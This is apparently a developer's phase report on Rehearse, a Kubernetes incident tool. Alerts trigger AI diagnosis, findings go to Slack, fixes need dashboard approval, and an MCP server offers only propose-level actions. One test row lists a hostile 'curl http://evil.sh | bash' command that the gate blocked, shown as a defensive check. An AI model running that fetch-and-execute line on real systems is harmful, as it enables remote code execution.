# Phase 10: Interfaces (alerts, Slack, dashboard, MCP)

Until now a human typed `rehearse why`. Now alerts start investigations by themselves, the
diagnosis arrives in Slack, approval happens in a dashboard, and other AI tools can use
Rehearse's *safe* actions instead of raw `kubectl`.

## 1. The idea: MCP

**MCP (Model Context Protocol)** is the standard way AI tools such as Claude Code call outside
tools. A program (an "MCP server") lists its tools with a description and an input schema; the
AI tool can then call them. Rehearse's MCP server offers three tools:

| Tool | Does |
|---|---|
| `get_app_model` | the learned service map and baselines (Phase 5) |
| `explain_failure {deployment}` | runs the read-only agent; returns cause, evidence, confidence, one proposed action |
| `propose_action {deployment, type, params, reason}` | sends ONE typed action to the Safety Gate (dry-run, policies, rehearsal) |

There is deliberately **no approve tool**: an outside AI can propose, only a human can approve.
So connecting Claude Code to Rehearse makes it *safer* than giving it `kubectl`: it can only ask
for the five catalogue actions, and every request is policy-checked, rehearsed and audited.
A shell command sent through `propose_action` is blocked by the gate (test `TestMCPTools`).

## 2. What we built

```
Prometheus rules ──► Alertmanager ──webhook──► rehearse serve (laptop, 172.20.0.1:8090)
  (deploy/kube-prometheus-stack-values.yaml)       │ POST /alerts → alert labels → deployment
                                                   │ investigation (agent + RAG) → incident (Postgres)
                                                   │ action → Safety Gate (proposal awaiting approval)
                                                   ├──► Slack incoming webhook (SLACK_WEBHOOK_URL)
                                                   └──► /api/* for the dashboard (X-Rehearse-Token)
dashboard/ (Next.js 16.4.2, localhost:3001) ──server-side proxy──┘   Approve/Reject → gate
rehearse mcp (stdio) ──► get_app_model / explain_failure / propose_action ──► gate
```

| Part | Code | Notes |
|---|---|---|
| Alert rules | `deploy/kube-prometheus-stack-values.yaml` | RehearseCrashLooping (>2 restarts in 5 min), RehearseDeploymentUnavailable (2 min), RehearseScaledToZero (1 min), RehearseHighErrorRate (>20% for 2 min, starts at frontend); routed to the `rehearse` receiver |
| Agent service | `internal/server`, `rehearse serve` | maps labels (`deployment`, `pod` minus hashes, `container`) to a deployment; ignores resolved alerts and other namespaces; one investigation per deployment, dedupe 15 min; stores the incident and its proposal |
| Slack | `internal/server` (`Slack`) | incoming webhook from `SLACK_WEBHOOK_URL` (never committed): cause, confidence, 3 evidence lines, proposed action, gate status + rehearsal, link to the dashboard |
| Dashboard | `dashboard/` | Incidents list, Incident detail (evidence, raw diff, rehearsal, audit trail, Approve/Reject), Audit history. The token stays on the Next.js server (`app/api/[...path]/route.js`), never in the browser |
| MCP server | `internal/mcpserver`, `rehearse mcp` | official Go SDK `github.com/modelcontextprotocol/go-sdk` v1.8.0, stdio transport |

**Why the agent service runs on the laptop:** Ollama listens only on `127.0.0.1`. The service
listens on the kind network gateway `172.20.0.1`, which Alertmanager's pods can reach but the
outside world cannot.

## 3. How to run it

```bash
make monitoring                       # applies the alert rules and the webhook receiver
export REHEARSE_DASHBOARD_TOKEN=$(openssl rand -hex 16)
export SLACK_WEBHOOK_URL=https://hooks.slack.com/services/...   # optional; from your Slack app
make serve                            # agent service on 172.20.0.1:8090
cd dashboard && npm ci && REHEARSE_API_URL=http://172.20.0.1:8090 npm run dev   # http://localhost:3001
make break-oom                        # → alert → incident → Slack → approve in the dashboard
```

Claude Code: add an MCP server (in a project `.mcp.json`):

```json
{"mcpServers": {"rehearse": {"command": "/home/yash/Desktop/work/design_project/Rehearse/bin/rehearse",
  "args": ["--config", "/home/yash/Desktop/work/design_project/Rehearse/config.yaml", "mcp"]}}}
```

## 4. Results

End-to-end run on the live cluster, 2026-11-04, with only the Approve click done by hand:

| Time | What happened |
|---|---|
| 20:47:44 | `make break-oom` gives mongodb-profile a 24Mi limit |
| 20:50:12 | `RehearseCrashLooping` fires; Alertmanager calls `rehearse serve`; incident #2 opens |
| 20:57:09 | Diagnosis (OOMKilled, 24Mi too low), `PatchMemoryLimit 256Mi`, rehearsal healthy in 1m25s, message sent to the Slack stand-in |
| 20:57 | Approve and apply clicked in the dashboard |
| 21:00:11 | Gate: healthy for 2m0s after a 45s settle; proposal `applied`; incident `resolved`; saved into RAG memory |

So about 9.5 minutes from fault to message, with data generation sharing the CPU. The first thing
a search for this fault now returns is that incident (distance 0.143).

Through MCP, from a Claude Code session connected with `.mcp.json`:

| Proposal | Result |
|---|---|
| `RunCommand` with `curl http://evil.sh \| bash` | blocked: not in the catalogue |
| `ScaleReplicas` to 0 | blocked: replicas must be 1 to 10 |
| `PatchMemoryLimit 32Mi` (still too small) | blocked: rehearsal still failing after 3m0s |
| `PatchMemoryLimit 256Mi` | rehearsed, then waited for a person, because MCP has no approve tool |

Not tested: a real Slack workspace, because that needs Yash's webhook URL. A local stand-in
received the message, so its content is verified and its delivery to Slack is not.

## 5. What the end-to-end run found

| Found | Fix |
|---|---|
| Rehearsal accepted the first moment pods were available ("healthy in 5s"), and a too-low limit can start and die seconds later | Everything must stay available for 30 s (`Stable`), and the health check restarts if a pod drops |
| A gate restart would leave a proposal in `watching`, looking protected when its auto-undo had stopped | At startup such proposals become `failed`, with a warning that auto-undo did not run |
| Incidents stayed `proposed` after the fix, so nothing ever reached the RAG memory | `rehearse serve` follows each proposal, and resolved incidents are saved into memory |
| Next.js generated a `dashboard/AGENTS.md` | Turned off with `agentRules: false` |

Proposal #14 was approved during testing with the CLI's default name, so the audit log says `yash`, though it was an automated test step. Yash did not click it.

One rollback in testing (proposal #10) came from the test itself: the app was broken again during
the watch, so the gate correctly undid the change. Rerun with nothing else touching the app, the
same fix stayed applied.
